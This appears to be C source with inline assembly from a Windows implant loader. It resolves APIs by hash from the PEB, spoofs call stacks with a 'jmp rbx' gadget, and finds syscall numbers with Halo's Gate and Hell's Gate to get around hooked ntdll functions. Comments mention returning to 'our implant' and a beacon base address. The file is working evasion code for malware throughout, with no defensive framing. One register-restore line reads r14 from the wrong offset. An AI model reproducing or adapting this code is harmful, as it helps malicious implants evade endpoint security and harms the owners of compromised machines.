#include "includes/projstructs.h"
#include "includes/PEB.h"
#include "includes/utils.h"
#include "includes/peb_api.h"
#include <stdio.h>
BYTE * loaded_module_base_from_hash(DWORD hash)
{
    _PEB  *peb = NULL;
    PEB_LDR_DATA *ldr = NULL;

    peb = (_PEB*) __readgsqword(0x60);
    BYTE utf8_module_base_name[256] = {0};

    LDR_DATA_TABLE_ENTRY * first_module_entry = (LDR_DATA_TABLE_ENTRY *)peb->pLdr->InLoadOrderModuleList.Flink;
    LDR_DATA_TABLE_ENTRY * this_module_entry  = first_module_entry;
    do
    {
        utf16_to_utf8(
                this_module_entry->BaseDllName.Buffer,
                (this_module_entry->BaseDllName.Length * 2),
                utf8_module_base_name
        );

        if ( hash == hash_ascii_string(utf8_module_base_name) )
        {
            return this_module_entry->DllBase;
        }
        RtlSecureZeroMemory(utf8_module_base_name,sizeof(utf8_module_base_name));
        this_module_entry = (LDR_DATA_TABLE_ENTRY *) this_module_entry->InLoadOrderLinks.Flink;
    } while (this_module_entry != first_module_entry); // list loops back to the start
    return NULL; // Did not find DLL base address
}

void get_sections(Dll* module)
{
    BYTE str_text[]  = { '.','t','e','x','t',0     };
    BYTE str_pdata[] = { '.','p','d','a','t','a',0 };

    for (DWORD i = 0; i < module->file_header->NumberOfSections; ++i) {
        if (MemoryCompare((BYTE*)module->section_header[i].Name, str_text, sizeof(str_text)))
        {
            module->text_section = (void*)((BYTE*)module->dllBase + module->section_header[i].VirtualAddress);
            module->text_section_size = (DWORD)module->section_header[i].SizeOfRawData;
        }
        if (MemoryCompare((BYTE*)module->section_header[i].Name, str_pdata, sizeof(str_pdata)))
        {
            module->pdata_section = (void*)((BYTE*)module->dllBase + module->section_header[i].VirtualAddress);
            module->pdata_section_size = (DWORD)module->section_header[i].SizeOfRawData;
        }
    }
}

void parse_module_headers(Dll* module)
{
    module->dos_header            = (PIMAGE_DOS_HEADER)module->dllBase;
    module->file_header           = (IMAGE_FILE_HEADER *)        ( (BYTE *)module->dllBase + module->dos_header->e_lfanew + 4);
    module->optional_header       = (IMAGE_OPTIONAL_HEADER64 *)  ( 0x14 + (BYTE*)module->file_header );
    module->optional_header_size  = (unsigned short)module->file_header->SizeOfOptionalHeader;
    module->section_header        = (IMAGE_SECTION_HEADER *)     ( (BYTE *)module->optional_header  + module->optional_header_size);
    module->export_directory      = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)module->dllBase + module->optional_header->DataDirectory[0].VirtualAddress);

    module->size                  = module->optional_header->SizeOfImage;
    module->SizeOfOptionalHeader  = module->optional_header_size;
    module->NumberOfSections      = module->file_header->NumberOfSections;
    module->EntryPoint            = (void*)((BYTE*)module->dllBase + module->optional_header->AddressOfEntryPoint);

    module->data_directory        = module->optional_header->DataDirectory;
    module->Export.Directory      = (void*)module->export_directory;
    module->Export.DirectorySize  = module->data_directory[0].Size;
    module->Export.AddressTable   = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfFunctions);
    module->Export.NameTable      = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfNames);
    module->Export.OrdinalTable   = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfNameOrdinals);
    module->Export.NumberOfNames  = ((DWORD)module->export_directory->NumberOfNames );

    module->import_directory_size = module->data_directory[1].Size;
    module->import_directory      = ((BYTE*)module->dllBase + module->data_directory[1].VirtualAddress);

    get_sections(module);
}



void * resolve_api_address_from_hash(DWORD api_hash, Dll * module)
{
    DWORD i = 0;
    DWORD* names;
    unsigned short* ordinals;
    DWORD* functions;
    BYTE* export_name;

    // Get function arrays
    names = (DWORD*)module->Export.NameTable;
    ordinals = (unsigned short*)module->Export.OrdinalTable;
    functions = (DWORD*)module->Export.AddressTable;

    // Loop over the names
    for (i = 0; i < module->Export.NumberOfNames; i++) {
        export_name = (BYTE*)(module->dllBase + names[i]);
        DWORD export_hash = hash_ascii_string(export_name);
        if (export_hash == api_hash)
        {
            return module->dllBase + functions[ordinals[i]];
        }
    }
    return 0;

}

void setup_synthetic_callstack(Spoof_Struct * spoof_struct)
{
    APIS api  = {0};
    Dll ntdll = {0};
    Dll k32   = {0};
    BYTE * ReturnAddress       = NULL;
    BYTE * BaseThreadInitThunk = NULL;
    BYTE * RtlUserThreadStart  = NULL;
    t_NtQueryInformationThread NtQueryInformationThread = NULL;

    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
    parse_module_headers( &ntdll );
    parse_module_headers(  &k32  );

    api.ntdll.RtlLookupFunctionEntry      = (tRtlLookupFunctionEntry)    resolve_api_address_from_hash( RTLLOOKUPFUNCTIONENTRY   , &ntdll );
    BaseThreadInitThunk                   = (BYTE *)                     resolve_api_address_from_hash( BASETHREADINITTHUNK      , &k32   );
    RtlUserThreadStart                    = (BYTE *)                     resolve_api_address_from_hash( RTLUSERTHREADSTART       , &ntdll );
    NtQueryInformationThread              = (t_NtQueryInformationThread) resolve_api_address_from_hash( NTQUERYINFORMATIONTHREAD , &ntdll );

    // JMP RBX Gadget
    BYTE jmp_rbx_gadget[] = { 0xFF, 0x23 };
    spoof_struct->gadget_return_address    = FindGadget((LPBYTE)k32.text_section, k32.text_section_size, jmp_rbx_gadget, sizeof(jmp_rbx_gadget));
    spoof_struct->gadget_stack_frame_size  = CalculateFunctionStackSizeWrapper(spoof_struct->gadget_return_address, &api);

    // Stack Frame - BaseThreadInitThunk
    ReturnAddress = *(PVOID *)find_api_return_address_on_stack( get_runtime_function_entry_for_api( &k32 , BaseThreadInitThunk ), BaseThreadInitThunk);
    spoof_struct->frame_1_stack_frame_size = CalculateFunctionStackSizeWrapper(ReturnAddress, &api);
    spoof_struct->frame_1_return_address   = ReturnAddress;

    // Stack Frame - RtlUserThreadStart
    ReturnAddress = *(PVOID *)find_api_return_address_on_stack( get_runtime_function_entry_for_api( &ntdll , RtlUserThreadStart ), RtlUserThreadStart);
    spoof_struct->frame_0_stack_frame_size = CalculateFunctionStackSizeWrapper(ReturnAddress, &api);
    spoof_struct->frame_0_return_address   = ReturnAddress;
};

void * xGetProcAddress_hash(DWORD api_hash, Dll * module)
{
    Dll ntdll     = { 0 };
    ntdll.dllBase = loaded_module_base_from_hash( NTDLL );
    parse_module_headers(&ntdll);

    tNtQueryVirtualMemory NtQueryVirtualMemory = resolve_api_address_from_hash( NTQUERYVIRTUALMEMORY , &ntdll );
    void * api_address = resolve_api_address_from_hash( api_hash , module );
    MEMORY_INFORMATION_CLASS mic = { 0 };
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    long status = NtQueryVirtualMemory(NtCurrentProcess(), (PVOID)api_address, mic, &mbi, sizeof(mbi), NULL);

    if (mbi.Protect != 0x10 && mbi.Protect != 0x20 && mbi.Protect != 0x40 && mbi.Protect != 0x80)
    {
        BYTE * api_forwarder_string = (BYTE *) api_address;
        BYTE * api_name = NULL;
        BYTE dll_forwarder_name[60] = {0};
        BYTE dot = '.';
        DWORD i = 0;
        DWORD j = 0;
        for (i = 0; api_forwarder_string[i] != '.'; i++);
        api_name = api_forwarder_string + i + 1;
        for (j=0; j<=i; j++)
        {
            dll_forwarder_name[j] = (BYTE*)api_forwarder_string[j];
        }
        dll_forwarder_name[j+0] = 'd';
        dll_forwarder_name[j+1] = 'l';
        dll_forwarder_name[j+2] = 'l';

        void * module_base = xLoadLibrary(dll_forwarder_name);

        ANSI_STRING api_ansi = {0};
        Spoof_Struct spoof_struct = { 0 };
        setup_synthetic_callstack(&spoof_struct);

        t_LdrGetProcedureAddress LdrGetProcedureAddress = resolve_api_address_from_hash( LDRGETPROCEDUREADDRESS , &ntdll );
        t_RtlInitAnsiString      RtlInitAnsiString      = resolve_api_address_from_hash( RTLINITANSISTRING      , &ntdll );

        spoof_synthetic_callstack(
                &api_ansi,             // Argument # 1
                api_name,              // Argument # 2
                NULL,                  // Argument # 3
                NULL,                  // Argument # 4
                &spoof_struct,         // Pointer to Spoof Struct
                RtlInitAnsiString,     // Pointer to API Call
                (void *)0              // Number of Arguments on Stack (Args 5+)
        );
        // RtlInitAnsiString( &api_ansi, api_name );
        spoof_synthetic_callstack(
                module_base,           // Argument # 1
                &api_ansi,             // Argument # 2
                NULL,                  // Argument # 3
                &api_address,          // Argument # 4
                &spoof_struct,         // Pointer to Spoof Struct
                LdrGetProcedureAddress,// Pointer to API Call
                (void *)0              // Number of Arguments on Stack (Args 5+)
        );
        // LdrGetProcedureAddress( module_base, &api_ansi, NULL, &api_address );
    }
    return api_address;
}

void getApis(APIS * api){
    Dll k32   = { 0 };
    Dll ntdll = { 0 };
    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
    parse_module_headers( &ntdll );
    parse_module_headers( &k32   );

    api->ntdll.pNtAllocateVirtualMemory     = xGetProcAddress_hash( NTALLOCATEVIRTUALMEMORY      , &ntdll  );
    api->ntdll.pNtProtectVirtualMemory      = xGetProcAddress_hash( NTPROTECTVIRTUALMEMORY       , &ntdll  );
    api->ntdll.pNtFreeVirtualMemory         = xGetProcAddress_hash( NTFREEVIRTUALMEMORY          , &ntdll  );
    api->ntdll.LdrLoadDll                   = xGetProcAddress_hash( LDRLOADDLL                   , &ntdll  );
    api->ntdll.RtlAnsiStringToUnicodeString = xGetProcAddress_hash( RTLANSISTRINGTOUNICODESTRING , &ntdll  );
    api->ntdll.LdrGetProcedureAddress       = xGetProcAddress_hash( LDRGETPROCEDUREADDRESS       , &ntdll  );
    api->ntdll.RtlFreeUnicodeString         = xGetProcAddress_hash( RTLFREEUNICODESTRING         , &ntdll  );
    api->ntdll.RtlInitAnsiString            = xGetProcAddress_hash( RTLINITANSISTRING            , &ntdll  );
    api->ntdll.NtUnmapViewOfSection         = xGetProcAddress_hash( NTUNMAPVIEWOFSECTION         , &ntdll  );
    api->ntdll.NtQueryVirtualMemory         = xGetProcAddress_hash( NTQUERYVIRTUALMEMORY         , &ntdll  );
    api->ker32.LoadLibraryExA               = xGetProcAddress_hash( LOADLIBRARYEXA               , &k32    );
    api->ker32.CreateFileMappingA           = xGetProcAddress_hash( CREATEFILEMAPPINGA           , &k32    );
    api->ker32.MapViewOfFile                = xGetProcAddress_hash( MAPVIEWOFFILE                , &k32    );
}

void * xLoadLibrary(void * library_name)
{
    DWORD hash;
    // Check if the DLL is already loaded and the entry exists in the PEBLdr
    void* LibraryAddress = (void*)loaded_module_base_from_hash(hash_ascii_string(library_name));
    // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
    if (LibraryAddress == NULL){
        APIS           api                   = { 0 };
        ANSI_STRING    ANSI_Library_Name     = { 0 };
        UNICODE_STRING UNICODE_Library_Name  = { 0 };
        Spoof_Struct   spoof_struct          = { 0 };

        setup_synthetic_callstack(&spoof_struct);

        getApis(&api);

        // Change ASCII string to ANSI struct string
        spoof_synthetic_callstack(
                &ANSI_Library_Name,            // Argument # 1
                library_name,                  // Argument # 2
                NULL,                          // Argument # 3
                NULL,                          // Argument # 4
                &spoof_struct,                 // Pointer to Spoof Struct
                api.ntdll.RtlInitAnsiString,         // Pointer to API Call
                (void *)0                      // Number of Arguments on Stack (Args 5+)
        );
        // api.RtlInitAnsiString(&ANSI_Library_Name,library_name);
        // RtlAnsiStringToUnicodeString converts the given ANSI source string into a Unicode string.
        // 3rd arg = True = routine should allocate the buffer space for the destination string. the caller must deallocate the buffer by calling RtlFreeUnicodeString.
        spoof_synthetic_callstack(
                &UNICODE_Library_Name,            // Argument # 1
                &ANSI_Library_Name,               // Argument # 2
                TRUE,                             // Argument # 3
                NULL,                             // Argument # 4
                &spoof_struct,                    // Pointer to Spoof Struct
                api.ntdll.RtlAnsiStringToUnicodeString, // Pointer to API Call
                (void *)0                         // Number of Arguments on Stack (Args 5+)
        );
        // api.RtlAnsiStringToUnicodeString( &UNICODE_Library_Name, &ANSI_Library_Name, TRUE );

        spoof_synthetic_callstack(
                NULL,                    // Argument # 1
                0,                       // Argument # 2
                &UNICODE_Library_Name,   // Argument # 3
                &LibraryAddress,         // Argument # 4
                &spoof_struct,           // Pointer to Spoof Struct
                api.ntdll.LdrLoadDll,          // Pointer to API Call
                (void *)0                // Number of Arguments on Stack (Args 5+)
        );
        // api.LdrLoadDll(NULL, 0,&UNICODE_Library_Name,&LibraryAddress);
        // cleanup
        spoof_synthetic_callstack(
                &UNICODE_Library_Name,    // Argument # 1
                NULL,                     // Argument # 2
                NULL,                     // Argument # 3
                NULL,                     // Argument # 4
                &spoof_struct,            // Pointer to Spoof Struct
                api.ntdll.RtlFreeUnicodeString, // Pointer to API Call
                (void *)0                 // Number of Arguments on Stack (Args 5+)
        );
        // api.RtlFreeUnicodeString( &UNICODE_Library_Name );
    }
    return LibraryAddress;
}





__asm__(
// "Registers RAX, RCX, RDX, R8, R9, R10, and R11 are considered volatile and must be considered destroyed on function calls."
// "RBX, RBP, RDI, RSI, R12, R14, R14, and R15 must be saved in any function using them."
// -- https://www.intel.com/content/dam/develop/external/us/en/documents/introduction-to-x64-assembly-181178.pdf

// Spoof (
//    RCX,           - API Call Argument # 1
//    RDX,           - API Call Argument # 2
//    r8,            - API Call Argument # 3
//    r9,            - API Call Argument # 4
//    [rsp+0x28],    - &Spoof_Struct - Pointer to Spoof Struct
//    [rsp+0x30],    - Pointer to API Call
//    [rsp+0x38],    - Number of Arguments on Stack (Args 5+)
//    [rsp+0x40],    - [optional] API Call Argument # 5 (if [rsp+0x38] == 1)
//    [rsp+0x48],    - [optional] API Call Argument # 6 (if [rsp+0x38] == 2)
//    [rsp+0x50],    - [optional] API Call Argument # 7 (if [rsp+0x38] == 3)
// ..)
        "spoof_synthetic_callstack:\n"
        "mov rax, r12\n"                      // move r12 into the volatile rax register
        "mov r10, rdi\n"                      // move rdi into the volatile r10 register
        "mov r11, rsi\n"                      // move rsi into the volatile r11 register
        "pop r12\n"                           // pop the real return address in r12
        "mov rdi, [rsp + 0x20]\n"             // &Spoof_Struct - spoof_synthetic_callstack() [rsp+0x28],    - Pointer to Spoof Struct
        "mov rsi, [rsp + 0x28]\n"             // spoof_synthetic_callstack() [rsp+0x30],    - Pointer to API Call
        // Save our original non-volatile registers. We will restore these later before returning to our implant
        "mov [rdi + 0x18], r10\n"              // Spoof_Struct.rdi
        "mov [rdi + 0x58], r11\n"              // Spoof_Struct.rsi
        "mov [rdi + 0x60], rax\n"              // Spoof_Struct.r12 ; r12 was saved to rax before clobbered
        "mov [rdi + 0x68], r13\n"              // Spoof_Struct.r13
        "mov [rdi + 0x70], r14\n"              // Spoof_Struct.r14
        "mov [rdi + 0x78], r15\n"              // Spoof_Struct.r15
        // registers rax, r10, r11 are now free to use again
        // rsp offset is now -0x8 for spoof_synthetic_callstack() args since we popped the ret into r12
        "prepare_synthetic_stack_frames:\n"
        "xor r11, r11\n"                      // r11 = loop counter
        "mov r13, [rsp + 0x30]\n"             // r13 = Number of Arguments on Stack (Args 5+)
        //"mov r14, 0x200\n"                  // r14 will hold the offset we need to push
        "xor r14, r14\n"                      // r14 will hold the offset we need to push
        "add r14, 0x08\n"
        // "add r14, [rdi + 0x80]\n"          // ThreadStartAddress  (Spoof_Struct.frame_2_stack_frame_size) stack frame size
        "add r14, [rdi + 0x38]\n"             // RtlUserThreadStart  (Spoof_Struct.frame_0_stack_frame_size) stack frame size
        "add r14, [rdi + 0x30]\n"             // jmp rbx gadget      (Spoof_Struct.gadget_stack_frame_size)  stack frame size
        "add r14, [rdi + 0x20]\n"             // BaseThreadInitThunk (Spoof_Struct.frame_1_stack_frame_size) stack frame size
        "sub r14, 0x20\n"                     // first stack arg is located at +0x28 from rsp, so we sub 0x20 from the offset. Loop will sub 0x8 each time
        "mov r10, rsp\n"
        "add r10, 0x30\n"                     // offset of stack arg added to rsp
        "loop_move_api_call_stack_args:\n"
        "xor r15, r15\n"                      // r15 will hold the offset + rsp base
        "cmp r11, r13\n"                      // comparing # of stack args added vs # of stack args we need to add
        "je create_synthetic_stack_frames\n"
        // Getting location to move the stack arg to
        "sub r14, 0x08\n"                     // 1 arg means r11 is 0, r14 already 0x28 offset
        "mov r15, rsp\n"                      // get current stack base
        "sub r15, r14\n"                      // subtract offset
        // Procuring the stack arg
        "add r10, 0x08\n"
        "push [r10]\n"
        "pop  [r15]\n"                        // move the stack arg into the right location
        // Increment the counter and loop back in case we need more args
        "add r11, 0x01\n"
        "jmp loop_move_api_call_stack_args\n"

        "create_synthetic_stack_frames:\n"
        //"sub rsp, 0x200\n"                  // Create new stack frame
        "push 0x0\n"                          // Push 0 to terminate stackwalk after RtlUserThreadStart stack frame
        // RtlUserThreadStart + 0x14  frame
        "sub rsp,   [rdi + 0x38]\n"           // RtlUserThreadStart  (Spoof_Struct.frame_0_stack_frame_size) stack frame size
        "mov r11,   [rdi + 0x40]\n"           // RtlUserThreadStart  (Spoof_Struct.frame_0_return_address)   return address
        "mov [rsp], r11\n"
        // BaseThreadInitThunk + 0x21 frame
        "sub rsp,   [rdi + 0x20]\n"           // BaseThreadInitThunk (Spoof_Struct.frame_1_stack_frame_size) stack frame size
        "mov r11,   [rdi + 0x28]\n"           // BaseThreadInitThunk (Spoof_Struct.frame_1_return_address)   return address
        "mov [rsp], r11\n"
        // ThreadStartAddress  frame
        // "sub rsp,   [rdi + 0x80]\n"        // ThreadStartAddress (Spoof_Struct.frame_2_stack_frame_size) stack frame size
        // "mov r11,   [rdi + 0x88]\n"        // ThreadStartAddress (Spoof_Struct.frame_2_return_address)   return address
        // "mov [rsp], r11\n"`
        // Gadget frame
        "sub rsp,   [rdi + 0x30]\n"           // jmp rbx gadget      (Spoof_Struct.gadget_stack_frame_size)  stack frame size
        "mov r11,   [rdi + 0x50]\n"           // jmp rbx gadget      (Spoof_Struct.gadget_return_address)    return address
        "mov [rsp], r11\n"
        // Adjusting the param struct for the fixup
        "mov r11,          rsi\n"             // Copying function to call into r11
        "mov [rdi + 0x08], r12\n"             // Spoof_Struct.original_return_address
        "mov [rdi + 0x10], rbx\n"             // Spoof_Struct.rbx - save original rbx to restore later
        "lea rbx,          [rip + fixup]\n"   // Fixup address is moved into rbx
        "mov [rdi],        rbx\n"             // Fixup member now holds the address of Fixup
        "mov rbx,          rdi\n"             // Address of param struct (Fixup) is moved into rbx
        // For indirect syscalls
        "mov r10, rcx\n"           // RCX = API Call Argument # 1
        "mov rax, [rdi + 0x48]\n"
        "jmp r11\n"                // jump to Spoof Struct -> Pointer to API Call
        "fixup:\n" // retore the stack of our implant and return to it
        "mov rcx, rbx\n"
        //"add rsp, 0x200\n"              // adjust RSP frame
        "add rsp, [rbx + 0x30]\n"         // Spoof_Struct.gadget_stack_frame_size
        // "add rsp, [rbx + 0x80]\n"      // Spoof_Struct.frame_2_stack_frame_size
        "add rsp, [rbx + 0x20]\n"         // Spoof_Struct.frame_1_stack_frame_size
        "add rsp, [rbx + 0x38]\n"         // Spoof_Struct.frame_0_stack_frame_size
        "mov rbx, [rcx + 0x10]\n"         // restore original rbx
        "mov rdi, [rcx + 0x18]\n"         // restore original rdi
        "mov rsi, [rcx + 0x58]\n"         // restore original rsi
        "mov r12, [rcx + 0x60]\n"         // restore original r12
        "mov r13, [rcx + 0x68]\n"         // restore original r13
        "mov r14, [rcx + 0x78]\n"         // restore original r14
        "mov r15, [rcx + 0x78]\n"         // restore original r15
        "mov rcx, [rcx + 0x08]\n"         // Spoof_Struct.original_return_address
        "jmp rcx\n"    // return to implant

        "returnRDI: \n"
        "mov rax, rdi \n"   // RDI is non-volatile. Raw Beacon Base Address will be returned
        "ret \n"

        "add: \n"
        "add rcx, rdx \n"
        "xchg rax, rcx \n"
        "ret \n"

        "getSyscallNumber: \n" // RAX,RCX,RDX
        "push rcx \n"
        "call findSyscallNumber \n"   // try to read the syscall directly
        "pop rcx \n"
        "test ax, ax \n"
        "jne syscallnothooked \n"
        "mov dx, 0 \n"                // index = 0
        "loopoversyscalls: \n"
        "push rcx \n"
        "push dx \n"
        "call halosGateUp\n"          // try to read the syscall above
        "pop dx \n"
        "pop rcx \n"
        "test ax, ax \n"
        "jne syscallnothookedup \n"
        "push rcx \n"
        "push dx \n"
        "call halosGateDown\n"        // try to read the syscall below
        "pop dx \n"
        "pop rcx \n"
        "test ax, ax \n"
        "jne syscallnothookeddown \n"
        "inc dx \n"                   // increment the index
        "jmp loopoversyscalls \n"
        "syscallnothooked: \n"
        "ret \n"
        "syscallnothookedup: \n"
        "sub ax, dx \n"
        "ret \n"
        "syscallnothookeddown: \n"
        "add ax, dx \n"
        "ret \n"

        "findSyscallNumber: \n"  // RAX,RCX,RSI,RDI
        "push rdi \n"
        "push rsi \n"
        "xor rsi, rsi \n"
        "xor rdi, rdi \n"
        "mov rsi, 0x00B8D18B4C \n"
        "mov edi, [rcx] \n"
        "cmp rsi, rdi \n"
        "jne error \n"
        "xor rax,rax \n"
        "mov ax, [rcx+4] \n"
        "jmp exitfsn \n"
        "error: \n"
        "xor rax, rax \n"
        "exitfsn:"
        "pop rsi \n"
        "pop rdi \n"
        "ret \n"

        "halosGateUp:          \n" // RAX,RSI,RDI,RDX
        "push rdi          \n"
        "push rsi          \n"
        "xor rsi, rsi      \n"
        "xor rdi, rdi      \n"
        "mov rsi, 0x00B8D18B4C \n"
        "xor rax, rax      \n"
        "mov al, 0x20      \n"
        "mul dx            \n"
        "add rcx, rax      \n"
        "mov edi, [rcx]    \n"
        "cmp rsi, rdi      \n"
        "jne HalosGateFail \n"
        "mov ax, [rcx+4]   \n"
        "jmp HalosGateExit \n"

        "halosGateDown:        \n" // RAX,RSI,RDI,RDX
        "push rdi          \n"
        "push rsi          \n"
        "xor rsi, rsi      \n"
        "xor rdi, rdi      \n"
        "mov rsi, 0x00B8D18B4C \n"
        "xor rax, rax      \n"
        "mov al, 0x20      \n"
        "mul dx            \n"
        "sub rcx, rax      \n"
        "mov edi, [rcx]    \n"
        "cmp rsi, rdi      \n"
        "jne HalosGateFail \n"
        "mov ax, [rcx+4]   \n"
        "HalosGateFail:        \n"
        "xor rax, rax      \n" // return 0x0 if fail to find syscall stub bytes
        "HalosGateExit:        \n"
        "pop rsi           \n"
        "pop rdi           \n"
        "ret               \n"

        "HellsGate:        \n" // Loads the Syscall number into the R11 register before calling HellDescent()
        "xor r11, r11  \n"
        "mov r11d, ecx \n" // Save Syscall Number in R11
        "ret           \n"

        "HellDescent:      \n" // Called directly after HellsGate
        "xor rax, rax  \n"
        "mov r10, rcx  \n"
        "mov eax, r11d \n" // Move the Syscall Number into RAX before calling syscall interrupt
        "syscall       \n"
        "ret           \n"

        );